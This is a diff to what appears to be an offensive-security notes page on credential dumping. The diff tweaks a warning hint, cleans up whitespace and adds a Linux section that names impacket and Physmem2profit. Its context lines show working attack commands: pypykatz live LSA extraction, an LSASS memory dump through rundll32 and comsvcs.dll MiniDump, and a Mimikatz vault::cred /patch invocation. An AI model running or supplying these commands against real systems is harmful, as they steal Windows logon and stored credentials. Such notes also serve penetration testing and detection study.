@@ -2,7 +2,7 @@
 
 ## LSASS
 
-{% hint style="warning" %}
+{% hint style="danger" %}
 high chances of detection
 {% endhint %}
 
@@ -30,10 +30,10 @@ pypykatz.exe live lsa
 # Using comsvcs.dll
 tasklist /FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
-<lsass process ID> C:\Users\Public\lsass.dmp full 
+<lsass process ID> C:\Users\Public\lsass.dmp full 
 ```
 
-### Logon Passwords&#x20;
+### Logon Passwords
 
 This usually shows recently logged on user and computer credentials.
 
@@ -49,4 +49,7 @@ Enumerates vault credentials of scheduled tasks.
 Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
 ```
 
-####
+## Linux
+
+* From a Linux attacking machine using **impacket**.
+* From a Linux attacking machine using **Physmem2profit.**
